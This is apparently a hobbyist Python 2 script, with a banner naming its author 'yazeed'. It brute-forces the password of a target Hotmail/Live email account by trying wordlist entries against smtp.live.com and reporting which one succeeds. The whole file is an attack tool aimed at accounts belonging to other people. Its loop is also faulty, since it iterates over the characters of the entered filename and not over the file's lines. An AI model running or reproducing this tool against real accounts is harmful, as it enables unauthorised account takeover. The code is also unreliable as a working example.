print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
print("+                                                          +")
print("+               [!] powered by yazeed [!]                  +")
print("+           My Email: Bilalyazeed4@gmail.com               +")
print("+                                                          +")
print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

import smtplib

smtpserver = smtplib.SMTP("smtp.live.com",587)
smtpserver.ehlo()
smtpserver.starttls()

email = raw_input("Enter Email Target: ")
print("++++++++++++++++++++++++++++++++++++++++")
passwfile = raw_input("Enter WordList File: ")

for password in passwfile:
    try:
        smtpserver.login(email,password)
        print("[+] PASS FOND ===> %s ") % password
        break;
    except smtplib.SMTPAuthenticationError:
        print("[!] PASS INCORRECT ===> %s ") % password    
    
